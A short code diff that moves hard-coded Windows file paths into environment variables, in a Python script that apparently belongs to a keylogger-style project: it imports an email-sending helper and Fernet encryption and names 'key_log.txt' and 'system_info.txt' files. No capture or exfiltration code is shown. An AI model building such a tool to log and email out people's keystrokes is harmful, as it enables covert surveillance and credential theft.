@@ -1,8 +1,11 @@
 from functions.send_email_log import send_email, toadrr
 from cryptography.fernet import Fernet
+import os
+from dotenv import load_dotenv
+load_dotenv()  
 
-file_path = "C:\\Users\\PC-Service\\OneDrive\\Desktop\\project\\files\\"
-encrypted_file_path = "C:\\Users\\PC-Service\\OneDrive\\Desktop\\project\\encrypted_files\\"
+file_path = os.getenv("FILE_PATH")
+encrypted_file_path = os.getenv("ENC_FILE_PATH")
 
 keys_information = "key_log.txt"
 system_information = "system_info.txt"
